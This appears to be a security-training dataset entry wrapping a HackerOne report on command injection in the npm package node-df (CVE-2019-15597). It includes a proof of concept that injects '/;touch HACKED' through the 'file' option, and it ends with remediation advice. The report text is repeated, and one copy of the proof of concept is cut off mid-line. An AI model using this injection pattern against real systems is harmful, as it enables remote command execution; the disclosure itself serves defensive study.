# CMDI — h1

- source: h1
- class: cmdi
- cwe: CWE-94
- cve: ['CVE-2019-15597']
- severity: high
- program: nodejs-ecosystem
- quality_score: 12

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** [node-df] RCE via insecure command concatenation
**Affected Asset:** node-df

**Vulnerability Description:**
I would like to report a `RCE` issue in the `node-df` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `node-df`
**version:** `0.1.4`
**npm page:** `https://www.npmjs.com/package/node-df`

## Module Description
> node-df (abbreviation of disk free) is a cross-platform Node.js wrapper around the standard Unix computer program, df.

## Module Stats
[N/A] downloads in the last day
[3,023] downloads in the last week
[N/A] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is concatenated inside a `command` that will be executed without any check. The issue arises here: 

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var df = require('node-df');
var options = {
        file: '/;touch HACKED',
        prefixMultiplier: 'GB',
        isDisplayPrefixMultiplier: true,
        precision: 2
    };
 
df(options, function (error, response) {
    if (error) { throw error; }
 
    console.log(JSON.stringify(response, null, 2));
});
```
1. Execute the following commands in terminal:

```bash
npm i node-df # Install affected module
ls # Make sure there isn't any *HACKED* file
node poc.js #  Run the PoC
ls # The *HACKED* file has been created
```
1. The `HACKED` file will be created {F594172}

## Patch
> Don't concatenate `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` on `node-df` via `insecure command concatenation`

**Steps to Reproduce:**
1. Create the following PoC file:

```js
// poc.js
var df = require('node-df');
var options = {
        file: '/;touch HACKED',
        prefixMultiplier: 'GB',
        isDisplayPrefixMultiplier: true,
        precision: 2
    };
 
df(options, function (error, response) {
    if (error) { throw error; }
 
    console.log(JSON.stringify(response, null, 2));
});
```
1. Execute the following commands in terminal:

```bash
npm i node-df # Install affected module
ls # Make sure there isn't any *HACKED* file
node poc.js #  Run the PoC
ls # The *HACKED* file has been created
```
1. The `HACKED` file will be created {F594172}

## Patch
> Don't concatenate `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

**Proof of Concept:**
```js
// poc.js
var df = require('node-df');
var options = {
        file: '/;t

## Analysis / Response

**Vulnerability Class:** cmdi
**CWE:** CWE-94
**Weakness:** Code Injection
**Severity:** high
**Endpoint Pattern:** https://www.npmjs.com/package/node-df

**Impact Assessment:**
`RCE` on `node-df` via `insecure command concatenation`

**Remediation:**
Avoid passing user input to system commands. Use language-native APIs instead of shell execution. If unavoidable, use strict allowlists for permitted values.
